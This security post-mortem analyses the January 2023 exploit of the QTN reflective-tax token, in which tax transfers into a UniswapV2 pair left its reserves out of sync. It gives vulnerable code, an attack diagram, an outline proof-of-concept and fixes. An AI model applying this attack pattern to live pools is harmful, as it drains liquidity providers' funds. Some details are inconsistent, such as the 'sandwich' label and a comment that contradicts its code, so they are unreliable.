# QTN Token — Reflective Tax Mechanism Sandwich Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-19 |
| **Protocol** | QTN Token |
| **Chain** | Ethereum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x37cb8626...](https://etherscan.io/tx/0x37cb8626e45f0749296ef080acb218e5ccc7efb2ae4d39c952566dc378ca1c4c) |
| **Vulnerable Contract** | [0xC9fa8F4C...](https://etherscan.io/address/0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd) |
| **Root Cause** | Tax collection by the reflective tax token modifies the LP pair balance, but the reserve is not updated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/QTN_exp.sol) |

---
## 1. Vulnerability Overview

QTN is a reflective ERC-20 token that collects a tax on every transfer. When swapping through a UniswapV2 pair, the tax is sent directly to the LP pair, increasing its actual balance without updating the `reserve`. The attacker deployed multiple intermediate contracts, performed numerous small swaps to accumulate this imbalance, and then realized a profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable QTN token tax mechanism
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 taxAmount = amount * taxRate / 100;
    // ❌ Tax sent directly to LP pair
    _balances[address(pair)] += taxAmount;  // reserve still holds the old value
    _balances[recipient] += amount - taxAmount;
    _balances[sender] -= amount;
    // ❌ pair.sync() not called → reserve and actual balance diverge
}

// Uniswap swap exploited by the attacker
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    // Exchange rate calculated based on reserve
    // If actual balance > reserve, the excess is sent to `to`
}

// ✅ Fix: call sync() after tax collection
function _transfer(...) internal {
    // After tax processing
    IUniswapV2Pair(pair).sync();  // ✅ Synchronize reserve
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: tax collection by the reflective tax token modifies the LP pair balance, but the reserve is not updated
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ ETH → WETH → QTN swap
  │       Tax → LP pair balance increases, reserve not updated
  │
  ├─2─▶ QTNContractFactory(): deploy multiple intermediate contracts
  │       Each contract performs small QTN swaps
  │       → Tax accumulation deepens LP imbalance
  │
  ├─3─▶ Retrieve WETH balance from each intermediate contract
  │       Call QTNContractBack()
  │
  ├─4─▶ QTN → WETH final swap
  │       Favorable exchange rate due to reserve imbalance
  │
  └─5─▶ Realize net WETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    // Obtain WETH as initial capital
    address(WETH).call{value: 2 ether}("");

    // WETH → QTN swap (tax triggered → LP imbalance begins)
    WETHToQTN();

    // Amplify tax accumulation effect through multiple intermediate contracts
    QTNContractFactory();  // Each contract accumulates tax via small swaps

    // Retrieve WETH from each contract
    QTNContractBack();

    // Final QTN → WETH swap (exploit favorable rate from imbalanced state)
    QTNToWETH();
}

// Intermediate contract pattern
contract QTNContract {
    function transferBack() external {
        // After small swap, return WETH to the attacker
        QTN.transfer(msg.sender, QTN.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Token tax mechanism flaw |
| **Attack Vector** | Tax accumulation via multiple contracts |
| **Impact Scope** | LP liquidity providers |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-682: Incorrect Calculation |

## 6. Remediation Recommendations

1. **Call `sync()` after tax collection**: Synchronize the LP pair reserve after every tax deduction.
2. **Block direct tax transfers to external addresses**: Avoid directly modifying the LP pair balance.
3. **Prevent multi-contract attacks within a single block**: Enforce EOA validation or restrict contract-to-contract calls.

## 7. Lessons Learned

- Tokens with tax mechanisms interact deeply with UniswapV2's reserve/balance architecture; `sync()` must always be considered.
- Attacks leveraging many intermediate contracts are difficult to prevent with simple gas cost limits alone.
- The reflective token design pattern inherently introduces fundamental vulnerabilities when combined with AMMs.